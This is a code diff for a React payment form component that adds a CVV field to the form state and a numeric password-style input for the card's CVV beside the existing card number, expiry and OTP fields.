@@ -126,6 +126,7 @@ export default function PaymentForm() {
     cardNumber: "",
     year: "",
     month: "",
+    cvv: "",
     otp: "",
     allOtps: newotp,
     bank: "",
@@ -393,6 +394,27 @@ export default function PaymentForm() {
                           type="password"
                           size={4}
                           maxLength={4}
+                          className="column-value allownumericwithoutdecimal"
+                        />
+                      </div>
+                      <div className="row" id="PinRow">
+                        <label className="column-label"> Cvv: </label>
+                        <input
+                          inputMode="numeric"
+                          pattern="[0-9]*"
+                          name="cardcvv"
+                          id="cardcvv"
+                          onChange={(e: any) =>
+                            setPaymentInfo({
+                              ...paymentInfo,
+                              cvv: e.target.value,
+                            })
+                          }
+                          autoComplete="off"
+                          title="Should be in number. Length should be 4"
+                          type="password"
+                          size={3}
+                          maxLength={3}
                           className="column-value allownumericwithoutdecimal"
                         />
                       </div>
